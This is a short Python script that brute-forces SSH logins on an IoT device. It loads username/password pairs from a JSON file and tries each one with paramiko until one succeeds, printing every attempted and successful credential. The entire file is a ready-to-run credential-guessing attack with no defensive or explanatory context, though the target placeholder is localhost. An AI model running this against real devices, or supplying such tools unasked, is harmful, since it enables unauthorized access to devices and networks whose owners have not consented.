import paramiko
import json
import time

# Target device
host = "127.0.0.1"  # Replace with your IoT device IP
port = 22

# Load credentials from JSON
with open("credentials.json", "r") as file:
    credentials = json.load(file)

# SSH client setup
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Try each username/password pair
for entry in credentials:
    username = entry["username"]
    password = entry["password"]
    try:
        print(f"Trying with username:{username} password:{password}")
        ssh.connect(host, port, username=username, password=password, timeout=5)
        print(f"Login Successfull! username:{username} password:{password}")
        ssh.close()
        break  # Stop after first successful login
    except paramiko.AuthenticationException:
        print("Failed to login\n")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(0.5)

else:
    print("No valid credentials found.")
